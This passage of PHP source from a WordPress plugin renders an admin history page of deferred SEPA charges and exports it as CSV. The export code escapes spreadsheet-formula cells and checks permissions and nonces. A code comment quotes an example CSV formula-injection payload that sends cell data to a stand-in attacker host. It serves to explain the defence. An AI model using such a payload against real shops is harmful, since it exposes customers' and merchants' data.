		),
		'dahu_deferred_sepa_export_history'
	);

	echo '<div class="dahu-ui-card">';
	echo '<p class="description">'
		. esc_html__( 'Charges sent by this gateway. Stripe\'s own immediate SEPA option is not listed here.', 'dahu-deferred-sepa' )
		. '</p>';

	echo '<form method="get" class="dahu-sepa-charges__filters">';
	echo '<input type="hidden" name="page" value="' . esc_attr( DAHU_DEFERRED_SEPA_CHARGES_PAGE ) . '">';
	echo '<input type="hidden" name="tab" value="history">';

	echo '<label>' . esc_html__( 'From', 'dahu-deferred-sepa' )
		. '<br><input type="date" name="dahu_from" value="' . esc_attr( $args['from'] ) . '"></label>';
	echo '<label>' . esc_html__( 'To', 'dahu-deferred-sepa' )
		. '<br><input type="date" name="dahu_to" value="' . esc_attr( $args['to'] ) . '"></label>';

	echo '<label>' . esc_html__( 'Outcome', 'dahu-deferred-sepa' ) . '<br><select name="dahu_result">';
	echo '<option value="">' . esc_html__( 'Any', 'dahu-deferred-sepa' ) . '</option>';

	foreach ( DAHU_DEFERRED_SEPA_RESULTS as $value ) {
		printf(
			'<option value="%s"%s>%s</option>',
			esc_attr( $value ),
			selected( $args['result'], $value, false ),
			esc_html( dahu_deferred_sepa_result_label( $value ) )
		);
	}

	echo '</select></label>';
	echo '<button class="dahu-ui-btn">' . esc_html__( 'Filter', 'dahu-deferred-sepa' ) . '</button>';
	echo '<a class="dahu-ui-btn" href="'
		. esc_url( admin_url( 'admin.php?page=' . DAHU_DEFERRED_SEPA_CHARGES_PAGE . '&tab=history' ) ) . '">'
		. esc_html__( 'Reset', 'dahu-deferred-sepa' ) . '</a>';
	echo '<a class="dahu-ui-btn dahu-ui-btn--go" href="' . esc_url( $export_url ) . '">'
		. esc_html__( 'Export CSV', 'dahu-deferred-sepa' ) . '</a>';
	echo '</form>';
	echo '</div>';

	echo '<div class="dahu-ui-card">';
	$table->display();
	echo '</div>';
}

/* ------------------------------------------------------------------
 * CSV export
 * ------------------------------------------------------------------ */

/**
 * A CSV cell that a spreadsheet will not treat as a formula.
 *
 * The customer name and the billing email are whatever the customer typed. A
 * cell beginning with =, +, -, @, a tab or a carriage return is read as a
 * formula by Excel and by LibreOffice, so a customer who registers as
 * `=HYPERLINK("https://evil.example?x="&A1,"Click")` gets that executed in the
 * shop's accounting spreadsheet. Prefixing an apostrophe is the documented way
 * to say "this is text"; it is stripped on display.
 *
 * @param mixed $value Cell value.
 * @return string
 */
function dahu_deferred_sepa_csv_cell( $value ) {
	$value = (string) $value;

	if ( '' === $value ) {
		return $value;
	}

	return in_array( $value[0], array( '=', '+', '-', '@', "\t", "\r" ), true ) ? "'" . $value : $value;
}

add_action( 'admin_post_dahu_deferred_sepa_export_history', 'dahu_deferred_sepa_export_history_csv' );

/**
 * Exports the filtered history.
 *
 * Streamed a page at a time rather than loaded whole, so an export of a long
 * history does not have to fit in memory all at once.
 *
 * @return void
 */
function dahu_deferred_sepa_export_history_csv() {
	if ( ! current_user_can( 'edit_shop_orders' )
		|| ! isset( $_GET['_wpnonce'] )
		|| ! wp_verify_nonce( sanitize_key( wp_unslash( $_GET['_wpnonce'] ) ), 'dahu_deferred_sepa_export_history' )
	) {
		wp_die( esc_html__( 'You are not allowed to do that.', 'dahu-deferred-sepa' ), '', array( 'response' => 403 ) );
	}

	$args = dahu_deferred_sepa_history_request_args();

	/**
	 * Filters the CSV delimiter.
	 *
	 * A comma by default, which is what the format is named after. Shops whose
	 * spreadsheet expects a semicolon can change it here.
	 *
	 * @param string $delimiter One character.
	 */
	$delimiter = (string) apply_filters( 'dahu_deferred_sepa_csv_delimiter', ',' );
	$delimiter = '' !== $delimiter ? substr( $delimiter, 0, 1 ) : ',';

	nocache_headers();
	header( 'Content-Type: text/csv; charset=utf-8' );
	header( 'Content-Disposition: attachment; filename=' . sprintf( 'sepa-charges-%s.csv', wp_date( 'Y-m-d' ) ) );

	// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen -- writing the HTTP response body, not a file.
	$handle = fopen( 'php://output', 'w' );

	// A byte-order mark, so a spreadsheet opens the UTF-8 correctly.
	echo "\xEF\xBB\xBF";

	$columns = array(
		__( 'Order', 'dahu-deferred-sepa' ),
		__( 'Customer', 'dahu-deferred-sepa' ),
		__( 'Email', 'dahu-deferred-sepa' ),
		__( 'Amount', 'dahu-deferred-sepa' ),
		__( 'Currency', 'dahu-deferred-sepa' ),
		__( 'First due', 'dahu-deferred-sepa' ),
		__( 'Finally due', 'dahu-deferred-sepa' ),
		__( 'Times moved', 'dahu-deferred-sepa' ),
		__( 'Sent', 'dahu-deferred-sepa' ),
		__( 'Outcome', 'dahu-deferred-sepa' ),
		__( 'PaymentIntent', 'dahu-deferred-sepa' ),
	);

	// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fputcsv -- as above.
	fputcsv( $handle, $columns, $delimiter );

	/*
	 * Walked by page over the ordered id list, and NOT stopped by a short page.
	 *
	 * A page can legitimately come back short: an id the query lists may fail
	 * to hydrate, because the order has since been trashed. Ending the file on
	 * `count( $rows ) < $per_page` would truncate an accounting export in the
	 * middle, silently — 199 rows written of 500 matching charges. The number of
	 * matching ids is what says when to stop.
	 */
	$per_page = 200;
	$total    = dahu_deferred_sepa_history_count( $args );
	$pages    = (int) ceil( $total / $per_page );

	for ( $page = 1; $page <= $pages; $page++ ) {
		foreach ( dahu_deferred_sepa_get_history_rows( $args, $page, $per_page ) as $row ) {
			// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fputcsv -- as above.
			fputcsv(
				$handle,
				array(
					dahu_deferred_sepa_csv_cell( $row['number'] ),
					dahu_deferred_sepa_csv_cell( $row['customer'] ),
					dahu_deferred_sepa_csv_cell( $row['email'] ),
					// A plain decimal point: this column is read by machines.
					number_format( $row['total'], 2, '.', '' ),
					$row['currency'],
					$row['first_ts'] ? dahu_deferred_sepa_format_date( $row['first_ts'] ) : '',
					$row['final_ts'] ? dahu_deferred_sepa_format_date( $row['final_ts'] ) : '',
					$row['reschedule'],
					$row['executed'] ? dahu_deferred_sepa_format_date( $row['executed'] ) : '',
					dahu_deferred_sepa_result_label( $row['result'] ),
					dahu_deferred_sepa_csv_cell( $row['intent'] ),
				),
				$delimiter
			);
		}
	}

	// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose -- as above.
	fclose( $handle );
	exit;
}
